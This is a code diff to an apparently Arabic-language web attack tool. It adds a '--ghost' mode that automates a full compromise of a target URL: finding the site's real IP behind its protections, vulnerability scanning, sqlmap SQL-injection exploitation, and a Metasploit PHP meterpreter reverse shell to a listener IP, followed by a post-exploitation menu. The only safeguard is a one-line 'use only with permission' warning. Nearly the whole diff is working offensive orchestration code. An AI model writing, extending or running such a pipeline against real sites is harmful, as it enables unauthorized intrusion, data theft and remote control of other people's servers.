@@ -392,6 +392,8 @@ def main():
     parser.add_argument("url", nargs="?", help="Target URL")
     parser.add_argument("--pwn", action="store_true",
                        help="Full automated attack: scan + exploit + sqlmap + metasploit + post-exploit")
+    parser.add_argument("--ghost", action="store_true",
+                       help="Ultimate full attack: IP breakthrough + scan + FP killer + orchestrate + sqlmap + metasploit + post-exploit")
     parser.add_argument("--interactive", "-i", action="store_true", help="Interactive TUI menu")
     parser.add_argument("--wizard", "-w", action="store_true", help="Interactive wizard (guided)")
     parser.add_argument("--auto", action="store_true",
@@ -508,12 +510,128 @@ def main():
 
     # Wizard mode (new default)
     if args.wizard or (not args.url and not args.auto and not args.full
-                       and not args.pwn and not args.interactive
+                       and not args.pwn and not args.ghost and not args.interactive
                        and not args.list_reverse and not args.list_web
                        and not args.reverse and not args.webshell
                        and not args.all_reverse):
         wizard = Wizard()
         wizard.main_menu()
+        return
+
+    # --ghost mode: Ultimate full attack
+    if args.ghost:
+        if not args.url:
+            log_error("--ghost يتطلب URL")
+            return
+        url = args.url
+        if not url.startswith("http"):
+            url = "http://" + url
+
+        log_phase("👻 GHOST MODE - العملية الشاملة الكاملة")
+        log_info(f"الهدف: {url}")
+        log_warn("⚠️  استخدم فقط على مواقع لديك إذن بفحصها!")
+        print()
+
+        # Import all needed modules
+        from modules.ip_breakthrough import IPBreakthrough
+        from modules.full_auto import FullAutoScanner
+        from modules.false_positive_killer import FalsePositiveKiller
+        from modules.attack_orchestrator import AttackOrchestrator
+        from modules.sqlmap_integration import SQLmapIntegration
+        from modules.metasploit_integration import MetasploitIntegration
+        from modules.post_exploit_menu import PostExploitMenu
+
+        # Phase 0: IP Breakthrough - إيجاد الـ IP الحقيقي
+        log_phase("Phase 0: إيجاد الـ IP الحقيقي (15 طريقة)")
+        ip_finder = IPBreakthrough()
+        ip_result = ip_finder.find(url)
+        ip_finder.print_report()
+
+        # Phase 1: الفحص الشامل
+        log_phase("Phase 1: الفحص الشامل")
+        options = {
+            "depth": args.depth,
+            "threads": args.threads,
+            "timeout": args.timeout,
+            "proxy": args.proxy,
+            "cookie": args.cookie,
+            "user_agent": args.user_agent,
+            "output": args.output,
+            "auto_exploit": True,
+            "listener_ip": args.listener_ip,
+            "listener_port": args.listener_port,
+        }
+
+        scanner = FullAutoScanner(url, options)
+        scan_result = scanner.run()
+
+        print(f"\n{Colors.GREEN}[✓] اكتمل الفحص{Colors.NC}")
+        print(f"  الثغرات الأولية: {len(scanner.all_vulns)}")
+
+        # Phase 2: False Positive Killer
+        log_phase("Phase 2: إزالة النتائج الكاذبة")
+        fp_killer = FalsePositiveKiller(scanner.client)
+        verified_vulns = fp_killer.filter_vulns(scanner.all_vulns, url)
+
+        print(f"  {Colors.GREEN}مؤكدة: {len(verified_vulns)}{Colors.NC}")
+        print(f"  {Colors.YELLOW}مُزالة: {len(scanner.all_vulns) - len(verified_vulns)}{Colors.NC}")
+
+        # Phase 3: Attack Orchestration
+        log_phase("Phase 3: تنظيم الهجوم الذكي")
+        orchestrator = AttackOrchestrator()
+        orchestrate_result = orchestrator.orchestrate(
+            url, verified_vulns,
+            http_client=scanner.client,
+            listener_ip=args.listener_ip,
+            listener_port=args.listener_port,
+        )
+        orchestrator.print_report(orchestrate_result)
+
+        # Phase 4: sqlmap (لو فيه SQLi)
+        sqli_vulns = [v for v in verified_vulns if "sql_injection" in v.get("type", "")]
+        if sqli_vulns:
+            log_phase("Phase 4: استغلال SQLi بـ sqlmap")
+            sqlmap = SQLmapIntegration()
+            if sqlmap.is_available():
+                sqli_url = sqli_vulns[0].get("url", url)
+                log_info(f"استغلال: {sqli_url}")
+                sqlmap.full_exploit(sqli_url)
+                sqlmap.print_results()
+            else:
+                log_warn("sqlmap غير متاح - تخطي")
+
+        # Phase 5: Metasploit
+        rce_vulns = [v for v in verified_vulns
+                     if v.get("type") in ["command_injection", "ssti", "file_upload"]]
+        if args.listener_ip and (rce_vulns or scan_result.get("shell_obtained")):
+            log_phase("Phase 5: Metasploit exploitation")
+            msf = MetasploitIntegration()
+            if msf.is_available():
+                msf.generate_php_meterpreter(args.listener_ip, args.listener_port)
+                msf.start_handler(args.listener_ip, args.listener_port)
+                msf.exploit_web_app(url, args.listener_ip, args.listener_port)
+                msf.print_results()
+            else:
+                log_warn("Metasploit غير متاح - تخطي")
+
+        # Phase 6: ما بعد الاختراق
+        if scan_result.get("shell_obtained") and scanner.shell_url:
+            log_phase("Phase 6: ما بعد الاختراق")
+            menu = PostExploitMenu(scanner.client)
+            menu.set_shell(scanner.shell_url)
+            menu.show_menu()
+
+        # تقرير نهائي
+        log_phase("📊 التقرير النهائي")
+        print(f"  {Colors.BOLD}الهدف:{Colors.NC} {url}")
+        if ip_result.get("real_ip"):
+            print(f"  {Colors.BOLD}الـ IP الحقيقي:{Colors.NC} {ip_result['real_ip']}")
+        print(f"  {Colors.BOLD}الثغرات المؤكدة:{Colors.NC} {len(verified_vulns)}")
+        print(f"  {Colors.BOLD}Shell:{Colors.NC} {'✓' if scan_result.get('shell_obtained') else '✗'}")
+        if scan_result.get("reports"):
+            print(f"  {Colors.BOLD}التقرير:{Colors.NC} {scan_result['reports'].get('html', '')}")
+        print()
+
         return
 
     # --pwn mode: Full automated attack with sqlmap + metasploit
